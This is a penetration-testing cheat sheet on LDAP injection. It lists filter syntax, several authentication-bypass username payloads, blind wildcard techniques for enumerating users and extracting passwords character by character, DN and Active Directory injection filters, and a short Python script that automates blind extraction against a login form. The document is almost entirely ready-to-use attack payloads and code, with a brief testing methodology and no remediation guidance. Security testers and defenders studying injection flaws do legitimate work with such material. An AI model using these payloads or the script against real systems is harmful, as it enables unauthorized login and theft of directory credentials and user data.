# LDAP Injection

## Overview
Injection of malicious LDAP statements into user-supplied input to bypass authentication, extract data, or modify directory entries.

## LDAP Filter Syntax
```
# Basic filter
(attribute=value)
(&(filter1)(filter2))   # AND
(|(filter1)(filter2))   # OR
(!(filter))             # NOT

# Authentication query:
(&(uid=USER)(password=PASS))
(&(cn=USER)(userPassword=PASS))
```

## Authentication Bypass
```
# Inject to make filter always true
Username: *)(uid=*))(|(uid=*
Password: anything

# Resulting query:
(&(uid=*)(uid=*))(|(uid=*)(password=anything))
# → First filter (&(uid=*)(uid=*)) is always true

# Simple bypass
Username: admin)(&
Password: anything
# (&(uid=admin)(&)(password=anything))
# (&) is always true

# Wildcard bypass
Username: *
Password: *

# Close parenthesis and add OR
Username: admin)(|(password=*)
# (&(uid=admin)(|(password=*)(password=anything))
```

## Data Extraction (Blind)
```
# Enumerate valid usernames via boolean response
Username: a* → true/false (exists users starting with 'a'?)
Username: ab* → true/false
Username: admin* → true/false

# Extract password character by character
(&(uid=admin)(userPassword=a*))  → check response
(&(uid=admin)(userPassword=ab*)) → check response
# If LDAP stores cleartext or weak hash

# Attribute enumeration
(cn=*) → all entries
(mail=*@target.com) → all emails

# Wildcard on all attributes
(&(objectClass=*)(uid=admin))
```

## Special Characters
```
# LDAP metacharacters
* \ ( ) \0 NUL

# Encoded forms:
* → \2a
( → \28
) → \29
\ → \5c
NUL → \00
/ → \2f
```

## Filter Injection via DN
```
# Distinguished Name injection
cn=admin,dc=target,dc=com
cn=admin)(|(cn=*),dc=target,dc=com

# OID injection
objectClass=*)(objectClass=posixAccount)(uid=root
```

## Blind Boolean Extraction Script
```python
import requests

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@.'
extracted = ''

for pos in range(1, 50):
    for char in charset:
        payload = f'admin)(|(uid=*' + extracted + char + '*'
        r = requests.post('/login', data={'username': payload, 'password': 'x'})
        if 'Welcome' in r.text or r.status_code == 200:
            extracted += char
            print(f'Found: {extracted}')
            break
```

## ActiveDirectory / LDAP Specifics
```
# AD attribute injection
(sAMAccountName=admin*)
(userPrincipalName=admin@domain.com*)
(memberOf=CN=Admins,DC=domain,DC=com)

# Bypass AD authentication
(|(sAMAccountName=*)(sAMAccountName=*))

# Extract all users
(objectCategory=person)(objectClass=user)

# Extract groups
(objectClass=group)
```

## Testing Methodology
1. Identify LDAP-backed authentication or search
2. Test with `*` as username — if login succeeds, LDAP wildcard works
3. Test authentication bypass payloads
4. Test for error messages revealing LDAP structure
5. Perform blind boolean extraction
6. Test in search fields: directory lookups, address books, user search

## Injection Points
- Login username/password fields
- User search / directory lookup
- Email/group lookup features
- LDAP-backed SSO systems
